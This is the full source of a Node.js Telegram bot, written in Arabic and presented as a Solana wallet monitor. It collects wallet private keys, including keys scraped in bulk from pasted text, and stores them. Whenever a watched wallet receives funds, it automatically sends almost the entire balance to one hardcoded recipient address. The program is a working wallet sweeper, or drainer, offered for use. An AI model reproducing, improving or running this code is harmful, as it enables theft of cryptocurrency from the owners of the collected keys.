const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const sqlite3 = require('sqlite3').verbose();
const crypto = require('crypto');
const bs58 = require('bs58');
const {
  Keypair,
  Connection,
  PublicKey,
  SystemProgram,
  Transaction,
  LAMPORTS_PER_SOL,
  sendAndConfirmTransaction
} = require('@solana/web3.js');

// Configuration
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const RPC_URL = process.env.RPC_URL;
const RPC_URL2 = process.env.RPC_URL2;
const RECIPIENT_ADDRESS = "FUMnrwov6NuztUmmZZP97587aDZEH4WuKn8bgG6UqjXG";
const POLLING_INTERVAL = 5000; // 5 seconds
const PORT = 5000;

// Messages in Arabic
const MESSAGES = {
  welcome: "🔮 مرحباً بك في البوت المبسط لمراقبة محافظ سولانا!\n\nسيتم تحويل أي مبلغ يصل للمحافظ تلقائياً إلى العنوان المحدد.\n\nاستخدم /help للمساعدة.",
  enterPrivateKey: "🔑 أرسل المفتاح الخاص للمحفظة:\n\n⚠️ لا تشارك مفتاحك الخاص مع أي شخص آخر!",
  invalidPrivateKey: "❌ المفتاح الخاص غير صحيح. حاول مرة أخرى.",
  monitoringStarted: "✅ تم بدء مراقبة المحفظة: {wallet}\n\n💰 سيتم تحويل أي مبلغ تلقائياً إلى:\n{recipient}",
  monitoringStopped: "🛑 تم إيقاف مراقبة المحفظة: {wallet}",
  walletNotFound: "❌ لم يتم العثور على المحفظة.",
  noWalletsMonitored: "📭 لا توجد محافظ مراقبة حالياً.\n\nاستخدم /monitor لبدء المراقبة.",
  walletAlreadyMonitored: "⚠️ هذه المحفظة مراقبة بالفعل.",
  helpText: `🤖 البوت المبسط لمراقبة محافظ سولانا

📋 الأوامر:
/start - بدء البوت
/monitor - بدء مراقبة محفظة واحدة
/add - إضافة عدة محافظ دفعة واحدة
/stop - إيقاف مراقبة محفظة
/list - عرض المحافظ المراقبة
/help - المساعدة

💰 يتم التحويل التلقائي لأي مبلغ إلى:
${RECIPIENT_ADDRESS.slice(0, 8)}...${RECIPIENT_ADDRESS.slice(-8)}

💡 نصائح:
• استخدم /add لإضافة مفاتيح متعددة بسرعة
• يمكن خلط المفاتيح مع نص عادي
• يدعم تنسيق base58 و array

⚠️ تنبيه:
لا تشارك مفاتيحك الخاصة!`
};

// Database setup
const db = new sqlite3.Database('wallets.db');

// Initialize database
db.serialize(() => {
  db.run(`CREATE TABLE IF NOT EXISTS monitored_wallets (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    chat_id INTEGER NOT NULL,
    wallet_address TEXT NOT NULL,
    private_key_encrypted TEXT NOT NULL,
    last_signature TEXT,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
  )`);

  db.run(`CREATE TABLE IF NOT EXISTS transaction_history (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    wallet_address TEXT NOT NULL,
    signature TEXT UNIQUE NOT NULL,
    amount TEXT NOT NULL,
    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
  )`);
});

// Encryption functions - FIXED: Using modern crypto methods
const ENCRYPTION_KEY = process.env.ENCRYPTION_KEY || crypto.randomBytes(32).toString('hex');
const IV_LENGTH = 16; // For AES, this is always 16

function encryptPrivateKey(privateKey) {
  try {
    const iv = crypto.randomBytes(IV_LENGTH);
    const cipher = crypto.createCipheriv('aes-256-gcm', Buffer.from(ENCRYPTION_KEY, 'hex'), iv);
    let encrypted = cipher.update(privateKey, 'utf8', 'hex');
    encrypted += cipher.final('hex');
    const authTag = cipher.getAuthTag().toString('hex');
    return `${iv.toString('hex')}:${authTag}:${encrypted}`;
  } catch (error) {
    console.error('Encryption error:', error);
    throw new Error('Failed to encrypt private key');
  }
}

function decryptPrivateKey(encryptedKey) {
  try {
    const parts = encryptedKey.split(':');
    if (parts.length !== 3) {
      throw new Error('Invalid encrypted key format');
    }
    
    const iv = Buffer.from(parts[0], 'hex');
    const authTag = Buffer.from(parts[1], 'hex');
    const encrypted = parts[2];
    
    const decipher = crypto.createDecipheriv('aes-256-gcm', Buffer.from(ENCRYPTION_KEY, 'hex'), iv);
    decipher.setAuthTag(authTag);
    
    let decrypted = decipher.update(encrypted, 'hex', 'utf8');
    decrypted += decipher.final('utf8');
    return decrypted;
  } catch (error) {
    console.error('Decryption error:', error);
    throw new Error('Failed to decrypt private key');
  }
}

// Utility functions
function truncateAddress(address, length = 8) {
  if (address.length <= length * 2) return address;
  return `${address.slice(0, length)}...${address.slice(-length)}`;
}

function extractPrivateKeysFromText(text) {
  const privateKeys = [];
  
  // Pattern for base58 keys (typically 87-88 characters)
  const base58Pattern = /[1-9A-HJ-NP-Za-km-z]{87,88}/g;
  
  // Pattern for array format keys
  const arrayPattern = /\[\s*(?:\d+\s*,\s*){63}\d+\s*\]/g;
  
  // Find base58 keys
  const base58Matches = text.match(base58Pattern) || [];
  for (const match of base58Matches) {
    if (match.length >= 87 && match.length <= 88) {
      privateKeys.push(match.trim());
    }
  }
  
  // Find array format keys
  const arrayMatches = text.match(arrayPattern) || [];
  for (const match of arrayMatches) {
    privateKeys.push(match.trim());
  }
  
  // Remove duplicates while preserving order
  const seen = new Set();
  return privateKeys.filter(key => {
    if (seen.has(key)) {
      return false;
    }
    seen.add(key);
    return true;
  });
}

function validatePrivateKey(privateKeyStr) {
  try {
    let privateKeyBytes;
    
    if (privateKeyStr.startsWith('[') && privateKeyStr.endsWith(']')) {
      const keyArray = JSON.parse(privateKeyStr);
      if (keyArray.length !== 64) {
        return { isValid: false, error: "Private key array must have exactly 64 bytes" };
      }
      privateKeyBytes = Uint8Array.from(keyArray);
    } else {
      try {
        privateKeyBytes = bs58.decode(privateKeyStr);
        if (privateKeyBytes.length !== 64) {
          return { isValid: false, error: "Private key must be 64 bytes" };
        }
      } catch (e) {
        return { isValid: false, error: "Invalid base58 encoding" };
      }
    }

    const keypair = Keypair.fromSecretKey(privateKeyBytes);
    const walletAddress = keypair.publicKey.toString();
    
    return { isValid: true, walletAddress, keypair };
  } catch (error) {
    return { isValid: false, error: `Invalid private key: ${error.message}` };
  }
}

// Solana connections with load balancing
class SolanaConnectionManager {
  constructor() {
    this.connections = [];
    this.currentIndex = 0;
    
    if (RPC_URL) {
      this.connections.push(new Connection(RPC_URL, 'confirmed'));
    }
    if (RPC_URL2) {
      this.connections.push(new Connection(RPC_URL2, 'confirmed'));
    }
    
    if (this.connections.length === 0) {
      throw new Error('No RPC URLs provided');
    }
  }

  getConnection() {
    const connection = this.connections[this.currentIndex];
    this.currentIndex = (this.currentIndex + 1) % this.connections.length;
    return connection;
  }
}

const connectionManager = new SolanaConnectionManager();

// Telegram Bot
const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: true });
const userStates = new Map();

// Bot handlers
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, MESSAGES.welcome);
});

bot.onText(/\/help/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, MESSAGES.helpText);
});

bot.onText(/\/monitor/, (msg) => {
  const chatId = msg.chat.id;
  userStates.set(chatId, 'waiting_private_key');
  bot.sendMessage(chatId, MESSAGES.enterPrivateKey);
});

bot.onText(/\/add/, (msg) => {
  const chatId = msg.chat.id;
  userStates.set(chatId, 'waiting_bulk_private_keys');
  bot.sendMessage(chatId, 
    "📝 أرسل المفاتيح الخاصة (يمكن إرسال عدة مفاتيح في رسالة واحدة):\n\n" +
    "💡 يمكنك إرسال:\n" +
    "• مفتاح واحد أو عدة مفاتيح\n" +
    "• مع أي نص إضافي (سيتم تجاهله)\n" +
    "• بتنسيق base58 أو array\n\n" +
    "⚠️ تأكد من أن المفاتيح صحيحة ولا تشاركها مع أي شخص آخر!"
  );
});

bot.onText(/\/stop/, (msg) => {
  const chatId = msg.chat.id;
  
  db.all("SELECT wallet_address FROM monitored_wallets WHERE chat_id = ?", [chatId], (err, rows) => {
    if (err) {
      console.error('Database error:', err);
      return;
    }
    
    if (rows.length === 0) {
      bot.sendMessage(chatId, MESSAGES.noWalletsMonitored);
      return;
    }
    
    if (rows.length === 1) {
      const walletAddress = rows[0].wallet_address;
      db.run("DELETE FROM monitored_wallets WHERE chat_id = ? AND wallet_address = ?", 
        [chatId, walletAddress], (err) => {
          if (err) {
            console.error('Database error:', err);
            return;
          }
          bot.sendMessage(chatId, MESSAGES.monitoringStopped.replace('{wallet}', truncateAddress(walletAddress)));
        });
    } else {
      // Multiple wallets - show keyboard
      const keyboard = {
        inline_keyboard: rows.map(row => [{
          text: `🔴 ${truncateAddress(row.wallet_address)}`,
          callback_data: `stop_${row.wallet_address}`
        }])
      };
      bot.sendMessage(chatId, "اختر المحفظة التي تريد إيقافها:", { reply_markup: keyboard });
    }
  });
});

bot.onText(/\/list/, (msg) => {
  const chatId = msg.chat.id;
  
  db.all("SELECT wallet_address FROM monitored_wallets WHERE chat_id = ?", [chatId], (err, rows) => {
    if (err) {
      console.error('Database error:', err);
      return;
    }
    
    if (rows.length === 0) {
      bot.sendMessage(chatId, MESSAGES.noWalletsMonitored);
      return;
    }
    
    let message = `📋 المحافظ المراقبة (${rows.length}):\n\n`;
    rows.forEach((row, index) => {
      message += `${index + 1}. ${truncateAddress(row.wallet_address)}\n`;
    });
    message += `\n💰 يتم التحويل التلقائي إلى:\n${truncateAddress(RECIPIENT_ADDRESS)}`;
    
    bot.sendMessage(chatId, message);
  });
});

// Handle callback queries
bot.on('callback_query', (callbackQuery) => {
  const message = callbackQuery.message;
  const data = callbackQuery.data;
  const chatId = message.chat.id;
  
  if (data.startsWith('stop_')) {
    const walletAddress = data.slice(5);
    
    db.run("DELETE FROM monitored_wallets WHERE chat_id = ? AND wallet_address = ?", 
      [chatId, walletAddress], (err) => {
        if (err) {
          console.error('Database error:', err);
          return;
        }
        bot.editMessageText(
          MESSAGES.monitoringStopped.replace('{wallet}', truncateAddress(walletAddress)),
          {
            chat_id: chatId,
            message_id: message.message_id
          }
        );
      });
  }
  
  bot.answerCallbackQuery(callbackQuery.id);
});

// Handle text messages
bot.on('message', (msg) => {
  const chatId = msg.chat.id;
  const text = msg.text;
  
  // Skip commands
  if (text && text.startsWith('/')) return;
  
  const userState = userStates.get(chatId);
  
  if (userState === 'waiting_private_key') {
    userStates.delete(chatId);
    handlePrivateKeyInput(chatId, text);
  } else if (userState === 'waiting_bulk_private_keys') {
    userStates.delete(chatId);
    handleBulkPrivateKeys(chatId, text);
  } else if (text && !text.startsWith('/')) {
    bot.sendMessage(chatId, "استخدم /help للمساعدة أو /monitor لبدء مراقبة محفظة");
  }
});

function handlePrivateKeyInput(chatId, privateKey) {
  const validation = validatePrivateKey(privateKey);
  
  if (!validation.isValid) {
    bot.sendMessage(chatId, MESSAGES.invalidPrivateKey);
    return;
  }
  
  const walletAddress = validation.walletAddress;
  
  // Check if already monitoring
  db.get("SELECT id FROM monitored_wallets WHERE chat_id = ? AND wallet_address = ?", 
    [chatId, walletAddress], (err, row) => {
      if (err) {
        console.error('Database error:', err);
        return;
      }
      
      if (row) {
        bot.sendMessage(chatId, MESSAGES.walletAlreadyMonitored);
        return;
      }
      
      // Add to database
      try {
        const encryptedKey = encryptPrivateKey(privateKey);
        db.run("INSERT INTO monitored_wallets (chat_id, wallet_address, private_key_encrypted) VALUES (?, ?, ?)",
          [chatId, walletAddress, encryptedKey], (err) => {
            if (err) {
              console.error('Database error:', err);
              bot.sendMessage(chatId, "❌ خطأ في إضافة المحفظة");
              return;
            }
            
            bot.sendMessage(chatId, 
              MESSAGES.monitoringStarted
                .replace('{wallet}', truncateAddress(walletAddress))
                .replace('{recipient}', truncateAddress(RECIPIENT_ADDRESS))
            );
          });
      } catch (error) {
        console.error('Encryption error:', error);
        bot.sendMessage(chatId, "❌ خطأ في تشفير المفتاح الخاص");
      }
    });
}

async function handleBulkPrivateKeys(chatId, text) {
  try {
    // Extract private keys from text
    const privateKeys = extractPrivateKeysFromText(text);
    
    if (privateKeys.length === 0) {
      bot.sendMessage(chatId, 
        "❌ لم يتم العثور على أي مفاتيح خاصة صحيحة في النص.\n\n" +
        "تأكد من أن المفاتيح بتنسيق صحيح (base58 أو array)."
      );
      return;
    }

    // Send initial status message
    const statusMessage = await bot.sendMessage(chatId,
      `🔄 جاري معالجة ${privateKeys.length} مفتاح...\n\n⏳ يرجى الانتظار...`
    );

    let successful = 0;
    let failed = 0;
    let alreadyMonitored = 0;
    const successfulWallets = [];
    const failedKeys = [];

    // Process each private key
    for (let i = 0; i < privateKeys.length; i++) {
      const privateKey = privateKeys[i];
      
      try {
        const validation = validatePrivateKey(privateKey);
        
        if (!validation.isValid) {
          failed++;
          failedKeys.push(`مفتاح غير صحيح: ${privateKey.substring(0, 20)}...`);
          continue;
        }

        const walletAddress = validation.walletAddress;

        // Check if already monitoring
        const existingWallet = await new Promise((resolve, reject) => {
          db.get("SELECT id FROM monitored_wallets WHERE chat_id = ? AND wallet_address = ?", 
            [chatId, walletAddress], (err, row) => {
              if (err) reject(err);
              else resolve(row);
            });
        });

        if (existingWallet) {
          alreadyMonitored++;
          continue;
        }

        // Add to database
        try {
          const encryptedKey = encryptPrivateKey(privateKey);
          await new Promise((resolve, reject) => {
            db.run("INSERT INTO monitored_wallets (chat_id, wallet_address, private_key_encrypted) VALUES (?, ?, ?)",
              [chatId, walletAddress, encryptedKey], function(err) {
                if (err) reject(err);
                else resolve();
              });
          });

          successful++;
          successfulWallets.push(truncateAddress(walletAddress));

          // Update progress every 5 keys or on last key
          if ((i + 1) % 5 === 0 || i === privateKeys.length - 1) {
            bot.editMessageText(
              `🔄 معالجة المفاتيح: ${i + 1}/${privateKeys.length}\n\n` +
              `✅ نجح: ${successful}\n` +
              `🔄 مراقب مسبقاً: ${alreadyMonitored}\n` +
              `❌ فشل: ${failed}\n\n` +
              "⏳ جاري المعالجة...",
              {
                chat_id: chatId,
                message_id: statusMessage.message_id
              }
            );
          }
        } catch (encryptionError) {
          failed++;
          failedKeys.push(`خطأ في التشفير: ${encryptionError.message}`);
        }

      } catch (error) {
        failed++;
        failedKeys.push(`خطأ في المعالجة: ${error.message}`);
      }
    }

    // Prepare final report
    let report = `📊 تقرير إضافة المحافظ:\n\n`;
    report += `🔢 إجمالي المفاتيح: ${privateKeys.length}\n`;
    report += `✅ تمت الإضافة بنجاح: ${successful}\n`;
    report += `🔄 مراقبة مسبقاً: ${alreadyMonitored}\n`;
    report += `❌ فشل: ${failed}\n\n`;

    if (successfulWallets.length > 0) {
      report += "✅ المحافظ المضافة:\n";
      successfulWallets.slice(0, 10).forEach((wallet, index) => {
        report += `  ${index + 1}. ${wallet}\n`;
      });
      if (successfulWallets.length > 10) {
        report += `  ... و ${successfulWallets.length - 10} محفظة أخرى\n`;
      }
      report += "\n";
    }

    if (failedKeys.length > 0) {
      report += "❌ مفاتيح فاشلة:\n";
      failedKeys.slice(0, 3).forEach((error, index) => {
        report += `  ${index + 1}. ${error}\n`;
      });
      if (failedKeys.length > 3) {
        report += `  ... و ${failedKeys.length - 3} خطأ آخر\n`;
      }
      report += "\n";
    }

    report += "🔔 المراقبة نشطة للمحافظ المضافة!";

    // Update final status
    bot.editMessageText(report, {
      chat_id: chatId,
      message_id: statusMessage.message_id
    });

    console.log(`Bulk added ${successful} wallets for user ${chatId}`);

  } catch (error) {
    console.error('Error in handleBulkPrivateKeys:', error);
    bot.sendMessage(chatId, `❌ حدث خطأ في معالجة المفاتيح: ${error.message}`);
  }
}

// Transaction monitoring
async function checkTransactions() {
  try {
    db.all("SELECT wallet_address, private_key_encrypted, last_signature FROM monitored_wallets", 
      async (err, rows) => {
        if (err) {
          console.error('Database error:', err);
          return;
        }
        
        for (const row of rows) {
          try {
            await checkWalletTransactions(row);
          } catch (error) {
            console.error(`Error checking wallet ${row.wallet_address.slice(0, 8)}:`, error);
          }
        }
      });
  } catch (error) {
    console.error('Error in transaction monitoring:', error);
  }
}

async function checkWalletTransactions(walletInfo) {
  try {
    const connection = connectionManager.getConnection();
    const publicKey = new PublicKey(walletInfo.wallet_address);
    
    const signatures = await connection.getSignaturesForAddress(publicKey, { limit: 10 });
    
    if (signatures.length === 0) return;
    
    const lastSignature = walletInfo.last_signature;
    
    if (!lastSignature) {
      // First time monitoring - set last signature
      db.run("UPDATE monitored_wallets SET last_signature = ? WHERE wallet_address = ?",
        [signatures[0].signature, walletInfo.wallet_address]);
      return;
    }
    
    // Find new transactions
    const newTransactions = [];
    for (const sig of signatures) {
      if (sig.signature === lastSignature) break;
      newTransactions.push(sig);
    }
    
    if (newTransactions.length > 0) {
      // Update last signature
      db.run("UPDATE monitored_wallets SET last_signature = ? WHERE wallet_address = ?",
        [newTransactions[0].signature, walletInfo.wallet_address]);
      
      // Process new transactions
      for (const txInfo of newTransactions.reverse()) {
        await processTransaction(walletInfo, txInfo);
      }
    }
  } catch (error) {
    console.error(`Error checking transactions for ${walletInfo.wallet_address}:`, error);
  }
}

async function processTransaction(walletInfo, txInfo) {
  try {
    const connection = connectionManager.getConnection();
    const transaction = await connection.getTransaction(txInfo.signature, {
      maxSupportedTransactionVersion: 0
    });
    
    if (!transaction) return;
    
    const { amount, isReceived } = calculateBalanceChange(transaction, walletInfo.wallet_address);
    
    if (isReceived && parseFloat(amount) > 0) {
      console.log(`💰 Received ${amount} SOL in wallet ${truncateAddress(walletInfo.wallet_address)}`);
      
      // Record transaction
      db.run("INSERT OR IGNORE INTO transaction_history (wallet_address, signature, amount) VALUES (?, ?, ?)",
        [walletInfo.wallet_address, txInfo.signature, amount]);
      
      // Send notification to all users monitoring this wallet
      db.all("SELECT chat_id FROM monitored_wallets WHERE wallet_address = ?", 
        [walletInfo.wallet_address], (err, rows) => {
          if (err) {
            console.error('Database error:', err);
            return;
          }
          
          // Send notification to each user
          rows.forEach(row => {
            const message = `💰 معاملة جديدة!\n\n` +
              `🏦 المحفظة: ${truncateAddress(walletInfo.wallet_address)}\n` +
              `💵 المبلغ: ${amount} SOL\n` +
              `📥 النوع: استلام\n` +
              `⏰ الوقت: ${new Date().toLocaleString('ar-EG')}\n` +
              `🔗 التوقيع: ${txInfo.signature.substring(0, 16)}...\n\n` +
              `🔄 سيتم التحويل التلقائي إلى:\n${truncateAddress(RECIPIENT_ADDRESS)}`;
            
            bot.sendMessage(row.chat_id, message).catch(error => {
              console.error(`Error sending notification to ${row.chat_id}:`, error);
            });
          });
        });
      
      // Auto-transfer after a delay
      setTimeout(async () => {
        await autoTransferFunds(walletInfo);
      }, 5000);
    }
  } catch (error) {
    console.error('Error processing transaction:', error);
  }
}

function calculateBalanceChange(transaction, walletAddress) {
  try {
    const meta = transaction.meta;
    const accountKeys = transaction.transaction.message.accountKeys;
    
    let walletIndex = -1;
    for (let i = 0; i < accountKeys.length; i++) {
      if (accountKeys[i].toString() === walletAddress) {
        walletIndex = i;
        break;
      }
    }
    
    if (walletIndex === -1) {
      return { amount: "0", isReceived: false };
    }
    
    const preBalance = meta.preBalances[walletIndex];
    const postBalance = meta.postBalances[walletIndex];
    const change = postBalance - preBalance;
    
    const amount = (Math.abs(change) / LAMPORTS_PER_SOL).toFixed(9);
    const isReceived = change > 0;
    
    return { amount, isReceived };
  } catch (error) {
    console.error('Error calculating balance change:', error);
    return { amount: "0", isReceived: false };
  }
}

async function autoTransferFunds(walletInfo) {
  try {
    console.log(`🔄 Starting auto-transfer from ${truncateAddress(walletInfo.wallet_address)}`);
    
    const connection = connectionManager.getConnection();
    const privateKey = decryptPrivateKey(walletInfo.private_key_encrypted);
    
    // Create keypair
    let keypair;
    if (privateKey.startsWith('[') && privateKey.endsWith(']')) {
      const keyArray = JSON.parse(privateKey);
      keypair = Keypair.fromSecretKey(Uint8Array.from(keyArray));
    } else {
      keypair = Keypair.fromSecretKey(bs58.decode(privateKey));
    }
    
    // Get balance
    const balance = await connection.getBalance(keypair.publicKey);
    const balanceInSol = balance / LAMPORTS_PER_SOL;
    
    if (balanceInSol < 0.002) {
      console.log(`Balance too low: ${balanceInSol} SOL`);
      return false;
    }
    
    // Calculate transfer amount (leave some for fees)
    const transferAmount = balance - 1000000; // Leave 0.001 SOL for fees
    
    if (transferAmount <= 0) {
      console.log('Not enough balance for transfer after fees');
      return false;
    }
    
    // Create transaction
    const recipientPublicKey = new PublicKey(RECIPIENT_ADDRESS);
    const transaction = new Transaction().add(
      SystemProgram.transfer({
        fromPubkey: keypair.publicKey,
        toPubkey: recipientPublicKey,
        lamports: transferAmount
      })
    );
    
    // Send transaction
    const signature = await sendAndConfirmTransaction(connection, transaction, [keypair]);
    
    console.log(`✅ Auto-transfer successful! TX: ${signature}`);
    console.log(`📤 Sent ${(transferAmount / LAMPORTS_PER_SOL).toFixed(9)} SOL to ${truncateAddress(RECIPIENT_ADDRESS)}`);
    
    return true;
  } catch (error) {
    console.error(`❌ Exception in auto-transfer: ${error}`);
    return false;
  }
}

// Start monitoring
setInterval(checkTransactions, POLLING_INTERVAL);

// Express app for health check
const app = express();

app.get('/', (req, res) => {
  res.json({
    status: 'running',
    message: 'Solana Wallet Monitor Bot',
    recipient: RECIPIENT_ADDRESS,
    timestamp: new Date().toISOString()
  });
});

app.get('/health', (req, res) => {
  db.get("SELECT COUNT(*) as count FROM monitored_wallets", (err, row) => {
    if (err) {
      res.status(500).json({ error: 'Database error' });
      return;
    }
    res.json({
      status: 'healthy',
      monitored_wallets: row.count,
      uptime: process.uptime()
    });
  });
});

app.listen(PORT, '0.0.0.0', () => {
  console.log('🚀 Starting Simplified Solana Monitor Bot...');
  console.log(`💰 Auto-transfer recipient: ${RECIPIENT_ADDRESS}`);
  console.log(`🌐 Server running on port ${PORT}`);
  console.log('✅ Bot is running!');
});

// Graceful shutdown
process.on('SIGINT', () => {
  console.log('🛑 Shutting down...');
  db.close();
  process.exit(0);
});
